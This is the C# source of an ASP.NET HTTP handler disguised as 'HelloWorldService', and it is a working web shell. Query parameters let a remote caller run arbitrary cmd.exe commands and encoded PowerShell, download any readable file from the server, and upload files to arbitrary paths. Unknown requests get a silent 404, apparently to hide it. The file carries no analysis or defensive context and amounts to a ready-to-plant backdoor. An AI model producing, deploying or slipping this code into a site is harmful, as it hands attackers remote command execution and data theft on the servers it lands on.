<%@ WebHandler Language="C#" Class="HelloWorldService" %>

using System;
using System.IO;
using System.Web;
using System.Diagnostics;

public class HelloWorldService : IHttpHandler
{
  public void ProcessRequest(HttpContext context) {
    switch ( context.Request.QueryString["a"] ) {
      case "cmd":
        this.do_run(context);
        break;
      case "pwsh":
        this.do_pwsh(context);
        break;
      case "down":
        this.do_down(context);
        break;
      case "up":
        this.do_up(context);
        break;
      default:
        context.Response.StatusCode = 404;
        context.Response.SuppressContent = true;
        break;
    }
  }

  public void do_run(HttpContext ctx)
  {
    string command = ctx.Request.QueryString["b"];

    using (Process p = new Process()) {
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.FileName = "cmd.exe";
      p.StartInfo.Arguments = "/c " + command;
      p.StartInfo.RedirectStandardOutput = true;
      p.Start();

      ctx.Response.Clear();
      p.StandardOutput.BaseStream.CopyTo(ctx.Response.OutputStream);
      p.WaitForExit();
    }
  }

  public void do_pwsh(HttpContext ctx)
  {
    string command = ctx.Request.QueryString["b"];

    using (Process p = new Process()) {
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.FileName = "powershell.exe";
      p.StartInfo.Arguments = "-enc " + command;
      p.StartInfo.RedirectStandardOutput = true;
      p.Start();

      ctx.Response.Clear();
      p.StandardOutput.BaseStream.CopyTo(ctx.Response.OutputStream);
      p.WaitForExit();
    }
  }

  public void do_down(HttpContext ctx) {
    string path = ctx.Request.QueryString["b"];

    using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.None)) {
        ctx.Response.Clear();
        fs.CopyTo(ctx.Response.OutputStream);
    }
  }

  public void do_up(HttpContext ctx) {
    using (FileStream fs = File.OpenWrite(ctx.Request.QueryString["b"])) {
        ctx.Request.Files["c"].InputStream.CopyTo(fs);
    }
  }

  public bool IsReusable {
    get {
      return false;
    }
  }
}
